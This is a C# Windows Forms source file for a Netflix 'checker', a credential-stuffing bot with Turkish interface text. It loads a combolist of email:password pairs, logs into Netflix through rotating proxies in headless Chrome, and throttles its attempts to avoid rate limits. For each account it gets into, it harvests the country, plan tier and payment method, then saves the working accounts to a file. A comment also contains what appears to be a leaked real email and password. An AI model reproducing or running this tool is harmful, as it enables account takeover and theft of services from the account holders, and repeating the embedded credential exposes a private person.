using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium;
using OpenQA.Selenium.Support.UI;
using System.IO;
using System.Threading;
using OpenQA.Selenium.Interactions;
namespace NetflixChecker
{
    public partial class Form1 : Form
    {
        String txtPath;
        String proxyPath;
        public Form1()
        {
            Control.CheckForIllegalCrossThreadCalls = false;
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            backgroundWorker1.RunWorkerAsync();
        }
        private bool IsElementPresent(IWebDriver driver,By by)
        {
            try
            {
                driver.FindElement(by);
                return true;
            }
            catch (NoSuchElementException)
            {
                return false;
            }
        }
        private void WriteSuccessUser(String username, String password,String country,string quality,string payment,string videoQuality,String maxStream)
        {
            listBox1.Items.Add(username + ":" + password + " Country: " + country + " Quality: " + quality + " Payment_method: " + payment + " Video_quality: " + videoQuality + " MaxStreams: " + maxStream);
        }
        private void WriteFailedUser(String username, String password)
        {
            listBox2.Items.Add(username + ":" + password );

        }
        public async void start(String netflixUsername,String netflixPassword)
        {
            ChromeDriverService _chromeDriverService;
            ChromeOptions _chromeOptions;
            IWebDriver driver;
            _chromeDriverService = ChromeDriverService.CreateDefaultService();
            _chromeDriverService.HideCommandPromptWindow = true;
            _chromeOptions = new ChromeOptions();
            _chromeOptions.AddArguments("headless"); // for background

            // _chromeOptions.AddHttpProxy(proxyId, proxyPort, proxyUsername, proxyPassword); //--> if you want 
            _chromeOptions.AddArgument("ignore-certificate-errors");

            //get random proxy 
            var r = new Random();
            var randomLineNumber = r.Next(0, listBox3.Items.Count);
            String line = listBox3.Items[randomLineNumber].ToString();
            String[] allProxy = line.Split(':');

            String proxyId = allProxy[0];
            int proxyPort = int.Parse(allProxy[1]);
            String proxyUsername = allProxy[2];
            String proxyPassword = allProxy[3];
            
            //end random proxy

            //select random proxy
            Proxy proxy = new Proxy();
            proxy.Kind = ProxyKind.Manual;
            proxy.IsAutoDetect = false;
            proxy.HttpProxy = proxyId + ":" + proxyPort;
            proxy.SocksUserName = proxyUsername;
            proxy.SocksPassword = proxyPassword;
            _chromeOptions.Proxy = proxy; //untick this if you want without proxy 
            //end select random proxy
            int maxStreams = 2;
            String paymentMethod = "Other";
            String quality = "Premium";
            String countryCode = "TR";
            string videoQuality = "HD";
            driver = new ChromeDriver(_chromeDriverService, _chromeOptions);
            try
            {
                driver.Navigate().GoToUrl("https://www.netflix.com/tr/login");
                Thread.Sleep(10000);
                Actions Builder = new Actions(driver);
                var mail = driver.FindElement(By.ClassName("nfEmailPhoneControls"));

                try
                {
                    Builder.SendKeys(mail, netflixUsername).Build().Perform();
                }
                catch
                {
                    driver.Navigate().Refresh();
                    Thread.Sleep(8000);
                    Builder.SendKeys(mail, netflixUsername).Build().Perform();
                }
                Thread.Sleep(1256);
                WebElement pass = (WebElement)driver.FindElement(By.ClassName("nfPasswordControls"));
              
                Actions Builder2 = new Actions(driver);
                Builder2.SendKeys(pass, netflixPassword).Build().Perform();
             
                Thread.Sleep(1256);
                WebElement clickButtonNext = (WebElement)driver.FindElement(By.CssSelector("button.btn.login-button.btn-submit.btn-small"));
                clickButtonNext.Click();
                Thread.Sleep(5000);
                Thread.Sleep(5000);
                String currentURL = driver.Url;

                if(currentURL == "https://www.netflix.com/browse")
                {

                    Thread.Sleep(8000);
                    try
                    {
                        var getProfile = driver.FindElements(By.ClassName("profile"));
                        getProfile[0].Click();
                        //set max streams 
                        if (getProfile.Count > 2)
                        {
                            maxStreams = 4;
                        }
                    }
                    catch{}
                    //get payment method 
                    driver.Navigate().GoToUrl("https://www.netflix.com/simplemember/managepaymentinfo");
                    Thread.Sleep(6000);
                    string imgMastercard = "img.logoIcon.MASTERCARD.icon-payment-image";
                    string imgVisa = "img.logoIcon.VISA.icon-payment-image";
                    string imgPaypal = "img.logoIcon.PAYPAL.icon-payment-image";

                    if (IsElementPresent(driver, By.CssSelector(imgMastercard)))
                    {
                        paymentMethod = "Mastercard";
                    }else if(IsElementPresent(driver, By.CssSelector(imgVisa)))
                    {
                        paymentMethod = "Visa";
                    }else if(IsElementPresent(driver, By.CssSelector(imgPaypal)))
                    {
                        paymentMethod = "Paypal";
                    }
                    label5.Text = "Plan bilgisi alınıyor..";
                    driver.Navigate().GoToUrl("https://www.netflix.com/YourAccount");
                    Thread.Sleep(7000);
                    var netflixQuality = driver.FindElements(By.TagName("b"));
                    int say = netflixQuality.Count;
                    if(say == 1)
                    {
                        quality = netflixQuality[0].Text;
                    }else if (say == 2)
                    {
                        quality = netflixQuality[1].Text;

                    }else
                    {
                        quality = netflixQuality[2].Text;
                    }
                    if(quality == "Estándar" ||  quality == "معيار" ||quality =="Padrão")
                    {
                        quality = "Standard";
                    }
                    if (quality == "مميزة" || quality == "프리미엄")
                    {
                        quality = "Premium";
                    }
                    if(quality == "Premium")
                    {
                        videoQuality = "UHD";
                    }

                    driver.Navigate().GoToUrl("https://www.netflix.com/AccountAccess");
                    Thread.Sleep(7000);

                    var netflixCountry = driver.FindElements(By.CssSelector("div.activityAccess"));
                    var elementTypes = netflixCountry[0].FindElements(By.TagName("div"));
                    string getAllText = elementTypes[0].Text;
                    string[] selectText = getAllText.Split('(');
                    countryCode = selectText[1].Substring(0,2);

                    //save user 
                    WriteSuccessUser(netflixUsername, netflixPassword,countryCode,quality,paymentMethod,videoQuality,maxStreams.ToString());
                    String up = label3.Text;
                    int sayi = int.Parse(up) + 1;
                    label3.Text = sayi.ToString();
                }
                else
                {
                    WriteFailedUser(netflixUsername, netflixPassword);
                    String up = label4.Text;
                    int sayi = int.Parse(up) + 1;
                    label4.Text = sayi.ToString();
                }
            }
            catch (Exception e)
            {
                WriteFailedUser(netflixUsername, netflixPassword);
                String up = label4.Text;
                int sayi = int.Parse(up) + 1;
                label4.Text = sayi.ToString();

            }
            finally{
                driver.Quit();
            }
        }
        private void backgroundWorker1_DoWork(object sender, System.ComponentModel.DoWorkEventArgs e)
        {
  
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void backgroundWorker1_DoWork_1(object sender, DoWorkEventArgs e)
        {
            try
            {

                label5.Text="Bot durumu: Aktif..";
                int say = 0;
                string[] allMail = File.ReadAllLines("user.txt");
                foreach (String mail in allMail)
                {
                    say++;
                    if(say % 15 == 0)
                    {
                        Thread.Sleep(70000);
                    }
                    String[] splitedUser = mail.Split(':');
                    /* 
                     * ahukapucu@hotmail.com:16ahu1973
                     */
                    //splitedUser[0]= Username 
                    //splitedUser[1] = Password  
                    String netflixUsername = "";
                    String netflixPassword = "";
                    try
                    {
                        netflixUsername = splitedUser[0].Trim();
                        netflixPassword = splitedUser[1].Trim();
                    }catch {}

                    var t = new Thread(() => start(netflixUsername, netflixPassword));
                    t.Start();
                    //start create mail
                }
                MessageBox.Show("Tüm hesaplar başarıyla tarandı.");

            }
            catch (Exception a)
            {
            }
        }
        private void label3_Click(object sender, EventArgs e)
        {

        }

        private void button2_Click(object sender, EventArgs e)
        {

        }

        private void button3_Click(object sender, EventArgs e)
        {
            openFileDialog1.ShowDialog();
            txtPath = openFileDialog1.FileName;
            label5.Text = "Combolist eklendi..";

        }

        private void button2_Click_1(object sender, EventArgs e)
        {
            openFileDialog1.ShowDialog();
            proxyPath = openFileDialog1.FileName;
            string[] allProxy = File.ReadAllLines(proxyPath);
            foreach (String proxy in allProxy)
            {
                listBox3.Items.Add(proxy);
            }
            label5.Text = "Proxy eklendi..";

        }

        private void button4_Click(object sender, EventArgs e)
        {
            string sPath = "successUser.txt";

            System.IO.StreamWriter SaveFile = new System.IO.StreamWriter(sPath);
            foreach (var item in listBox1.Items)
            {
                SaveFile.WriteLine(item);
            }
            SaveFile.Close();

            MessageBox.Show("Çalışan hesaplar başarıyla kaydedildi.");
        }

        private void button5_Click(object sender, EventArgs e)
        {
            string sPath = "failedUser.txt";

            System.IO.StreamWriter SaveFile = new System.IO.StreamWriter(sPath);
            foreach (var item in listBox2.Items)
            {
                SaveFile.WriteLine(item);
            }
            SaveFile.Close();

            MessageBox.Show("Çalışmayan hesaplar başarıyla kaydedildi.");
        }
    }
}
